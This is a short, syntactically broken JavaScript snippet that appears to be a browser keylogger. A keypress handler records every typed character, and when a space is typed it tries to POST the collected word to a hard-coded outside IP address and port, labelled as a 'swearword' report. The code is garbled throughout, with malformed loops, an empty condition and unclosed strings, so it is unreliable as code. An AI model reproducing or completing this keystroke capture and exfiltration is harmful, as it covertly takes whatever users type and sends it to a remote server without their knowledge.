
var word = new Array();

function sendMethod(){
	var str
	for(var i=0;var<word.length;var++){
		str= str+word[i];
	}
	if(){
		$.post("http://107.170.73.156:8001/userswore.html"),
        {name:"username"
        swearword:"
	}
word.length=0;
}
document.onkeypress = function(e) {
    e = e || window.event;
    var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
    if (charCode) {
	if(charCode == " ".charCodeAt(0)){
	sendMethod()
	}
	else{
	console.log(String.fromCharCode(charCode));
	word.push(String.fromCharCode(charCode));
	}
    }
};


